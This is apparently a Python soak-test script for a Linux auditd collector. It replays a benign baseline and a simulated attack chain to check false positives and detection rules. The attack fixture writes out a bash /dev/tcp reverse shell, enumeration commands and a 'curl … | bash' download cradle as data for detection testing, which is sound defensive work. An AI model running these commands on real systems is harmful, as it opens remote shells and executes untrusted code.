#!/usr/bin/env python3
"""Simulated Linux (auditd) collector soak — the mirror of the Windows one.

The REAL collector code path is exercised: `parse_audit_line` (the actual
normalization) plus the real `Shipper` (buffering, host_id + log_source
stamping, batch POST). Two OS-specific reads are simulated, exactly like the
Windows soak simulates win32evtlog:
  - the auditd log tail itself (this script feeds audit.log lines directly),
  - the /proc lookups `_ppid_and_comm` / `_cmdline` (they read the *host's*
    real processes; the soak patches them with a fixture so the fake audit
    stream maps to a coherent fake process table).

Everything downstream — normalization, shipping, backend ingest, and every
detection rule — is the production path.

Two phases, both into one live source=live session:
  A. benign baseline — service boot, an SSH login, a desktop session, and
     browsing. Parents are deliberately NON script-hosts (systemd/sshd/
     gnome-shell) so the fresh-DB first-seen rule stays quiet; the 443
     fan-out is exempted by the network-scan browsing fix. Alerts here =
     false-positive candidates.
  B. known-malicious story — cron -> bash reverse shell (/dev/tcp) ->
     enumeration (whoami/uname/getent/ss) -> curl|bash -> C2 (:4444).
     Alerts here = the detection sanity check.

Run:  .venv/bin/python scripts/soak_linux_collector.py [--backend http://127.0.0.1:8001] [--host $(hostname)] [--gate]
"""

import argparse
import json
import sys
import time
import urllib.request
from collections import defaultdict
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "collectors" / "linux"))
sys.path.insert(0, str(ROOT / "collectors" / "common"))

import collector_linux  # noqa: E402
from shipper import Shipper, agent_run_name  # noqa: E402

BASE = "http://127.0.0.1:8001"


def _post(path: str, body) -> dict:
    req = urllib.request.Request(
        f"{BASE}{path}",
        data=json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read())


def _get(path: str) -> dict:
    with urllib.request.urlopen(f"{BASE}{path}") as resp:
        return json.loads(resp.read())


def _saddr(ip: str, port: int) -> str:
    """auditd's sockaddr_in hex: family (2B) + port big-endian (2B) + addr (4B)."""
    return "0200" + f"{port:04X}" + "".join(f"{int(o):02X}" for o in ip.split("."))


def _ticker(start: float, step: float):
    t = [start]

    def tick() -> float:
        t[0] += step
        return t[0]

    return tick


# ---------------------------------------------------------------------------
# The simulated process table — what /proc would have answered on the target
# host at capture time. pid -> (ppid, comm, full command line).
# ---------------------------------------------------------------------------
FAKE_PROC: dict[int, tuple[int | None, str, str]] = {}


def _audit_exec(ts: float, seq: int, pid: int, cmdline: str) -> str:
    """One process_create as auditd emits it (SYSCALL execve record)."""
    return (f"type=SYSCALL msg=audit({ts:.3f}:{seq}): arch=c000003e syscall=59 "
            f"success=yes exit=0 pid={pid}")


def _audit_conn(ts: float, seq: int, pid: int, ip: str, port: int) -> str:
    """One connect(2) as auditd emits it (SYSCALL record with saddr hex)."""
    return (f"type=SYSCALL msg=audit({ts:.3f}:{seq}): syscall=42 success=yes "
            f"exit=0 pid={pid} saddr={_saddr(ip, port)}")


def _benign_baseline(now: float) -> list[str]:
    """~20 normal audit lines — service boot, SSH login, desktop, browsing.

    Parents are non script-hosts (systemd/sshd/gnome-shell) so the fresh-DB
    first-seen rule (script-host parent required) stays quiet, and the 443
    fan-out is exempt from network-scan (browsing fix)."""
    tick = _ticker(now - 240, 4)
    seq = [100]
    lines: list[str] = []

    def proc(pid: int, ppid: int | None, comm: str, cmdline: str):
        FAKE_PROC[pid] = (ppid, comm, cmdline)
        seq[0] += 1
        lines.append(_audit_exec(tick(), seq[0], pid, cmdline))

    # Boot / services — everything under systemd (pid 1, not a script host).
    proc(1, 0, "systemd", "/usr/lib/systemd/systemd --switched-root --system --deserialize 31")
    proc(300, 1, "systemd-journald", "/usr/lib/systemd/systemd-journald")
    proc(310, 1, "systemd-udevd", "/usr/lib/systemd/systemd-udevd")
    proc(320, 1, "NetworkManager", "/usr/sbin/NetworkManager --no-daemon")
    proc(330, 1, "systemd-logind", "/usr/lib/systemd/systemd-logind")
    proc(340, 1, "cron", "/usr/sbin/cron -f")
    proc(350, 1, "sshd", "/usr/sbin/sshd -D")
    proc(360, 1, "dbus-daemon", "/usr/bin/dbus-daemon --system --address=systemd:")
    proc(370, 1, "polkitd", "/usr/lib/polkit-1/polkitd --no-debug")
    proc(380, 1, "systemd-resolved", "/usr/lib/systemd/systemd-resolved")
    proc(390, 1, "systemd-timesyncd", "/usr/lib/systemd/systemd-timesyncd")
    # SSH login: sshd -> bash (login shell). bash's parent is sshd (not a
    # script host), so bash itself is not first-seen — and the baseline stops
    # there (bash *children* would be first-seen on a fresh DB).
    proc(410, 350, "sshd", "/usr/sbin/sshd -D -R")
    proc(420, 410, "bash", "-bash")
    # Desktop session: systemd --user -> gnome-shell -> firefox.
    proc(500, 1, "systemd", "/usr/lib/systemd/systemd --user")
    proc(510, 500, "gnome-shell", "/usr/bin/gnome-shell --wayland")
    proc(520, 510, "firefox", "/usr/lib/firefox/firefox --new-window https://example.com")

    # Network: firefox's 443 fan-out (exempt: web ports) + resolved's DNS.
    for ip in ("1.1.1.1", "172.217.14.110", "13.107.42.12", "104.18.24.7", "151.101.2.132"):
        seq[0] += 1
        lines.append(_audit_conn(tick(), seq[0], 520, ip, 443))
    seq[0] += 1
    lines.append(_audit_conn(tick(), seq[0], 380, "192.168.1.1", 53))
    seq[0] += 1
    lines.append(_audit_conn(tick(), seq[0], 380, "1.1.1.1", 53))
    return lines


def _malicious_story(now: float) -> list[str]:
    """cron -> bash reverse shell -> recon -> curl|bash -> C2 (:4444)."""
    tick = _ticker(now - 120, 5)
    seq = [500]
    lines: list[str] = []

    def proc(pid: int, ppid: int | None, comm: str, cmdline: str):
        FAKE_PROC[pid] = (ppid, comm, cmdline)
        seq[0] += 1
        lines.append(_audit_exec(tick(), seq[0], pid, cmdline))

    # cron spawns bash (the malicious job) — then everything is bash's child.
    proc(700, 340, "bash", "bash -i >& /dev/tcp/198.51.100.10/4444 0>&1")
    seq[0] += 1
    lines.append(_audit_conn(tick(), seq[0], 700, "198.51.100.10", 4444))
    # Reconnaissance burst (4 distinct enum kinds -> enumeration-burst).
    proc(710, 700, "whoami", "whoami")
    proc(711, 700, "uname", "uname -a")
    proc(712, 700, "getent", "getent passwd")
    proc(713, 700, "ss", "ss -tulpn")
    # curl|bash download cradle + a second C2 channel.
    proc(720, 700, "curl", "curl http://185.220.101.34/x.sh | bash")
    seq[0] += 1
    lines.append(_audit_conn(tick(), seq[0], 720, "185.220.101.34", 80))
    proc(730, 700, "bash", "bash -i")
    seq[0] += 1
    lines.append(_audit_conn(tick(), seq[0], 730, "185.220.101.34", 4444))
    return lines


def _report(phase: str, alerts: list[dict]) -> None:
    by_rule: dict[str, list[dict]] = defaultdict(list)
    for a in alerts:
        by_rule[a["rule_id"]].append(a)
    if not by_rule:
        print(f"  {phase}: 0 alerts — clean")
        return
    for rule_id in sorted(by_rule, key=lambda r: -len(by_rule[r])):
        sample = by_rule[rule_id][0]
        print(f"  {phase} · {rule_id} ×{len(by_rule[rule_id])}")
        print(f"      e.g. {str(sample.get('details', ''))[:110]}")


def main() -> int:
    global BASE
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--backend", default="http://127.0.0.1:8001")
    ap.add_argument("--host", default="archlinux")
    ap.add_argument("--gate", action="store_true",
                    help="CI gate: exit 1 if the benign baseline fires ANY alert "
                         "(FP budget zero) or the malicious story misses its core "
                         "detections.")
    args = ap.parse_args()
    BASE = args.backend.rstrip("/")

    run = _post("/runs", {"sample_name": agent_run_name(args.host),
                          "platform": "linux", "session_type": "live"})
    run_id = run["run_id"]
    print(f"Linux collector soak → live session {run_id} (host {args.host}, "
          f"source=live, platform=linux)\n")

    # Simulated /proc: the two OS-dependent reads are patched to answer from
    # the fixture; parse_audit_line + everything downstream stays real.
    collector_linux._ppid_and_comm = lambda pid: (
        (FAKE_PROC[pid][0], FAKE_PROC[pid][1]) if pid in FAKE_PROC else (None, None))
    collector_linux._cmdline = lambda pid: (
        FAKE_PROC[pid][2] if pid in FAKE_PROC else None)

    shipper = Shipper(BASE, run_id, host_id=args.host)
    pid_cache: dict[int, bool] = {}

    # Phase A — benign baseline (FP measurement).
    benign = _benign_baseline(time.time())
    for line in benign:
        ev = collector_linux.parse_audit_line(line, pid_cache)
        if ev:
            shipper.add(ev)
    shipper.flush()
    time.sleep(0.3)
    alerts_a = _get(f"/runs/{run_id}/alerts")
    print(f"Phase A — benign baseline ({len(benign)} audit lines):")
    _report("FP?", alerts_a)

    # Phase B — malicious kill chain (detection sanity check).
    evil = _malicious_story(time.time())
    for line in evil:
        ev = collector_linux.parse_audit_line(line, pid_cache)
        if ev:
            shipper.add(ev)
    shipper.flush()
    time.sleep(0.3)
    alerts_b = _get(f"/runs/{run_id}/alerts")
    print(f"\nPhase B — known-malicious reverse-shell story ({len(evil)} audit lines):")
    _report("DET", alerts_b)

    fp_rules = {a["rule_id"] for a in alerts_a}
    print("\n══════════════════════════════════════════════════════")
    print("Honest framing: only the auditd log tail and the /proc reads are")
    print("simulated; the parser, shipper, backend ingest, and every detection")
    print("rule are the production path.")
    print(f"  FP candidates (fired on the modeled benign baseline): "
          f"{sorted(fp_rules) or 'none'}")
    print(f"  Detection rules (malicious story): "
          f"{sorted({a['rule_id'] for a in alerts_b}) or 'none'}")
    print(f"  Run: {run_id} — open in the webapp at /runs/{run_id}")

    if args.gate:
        core = {"lolbin-abuse", "unusual-port", "enumeration-burst"}
        fired_b = {a["rule_id"] for a in alerts_b}
        problems: list[str] = []
        if fp_rules:
            problems.append(f"benign baseline fired {sorted(fp_rules)} — FP budget exceeded")
        missing = sorted(core - fired_b)
        if missing:
            problems.append(f"malicious story missed core detections: {missing}")
        if problems:
            print("\nGATE FAILED:")
            for p in problems:
                print(f"  ✗ {p}")
            return 1
        print("\nGATE PASSED — benign baseline clean, all core detections fired.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
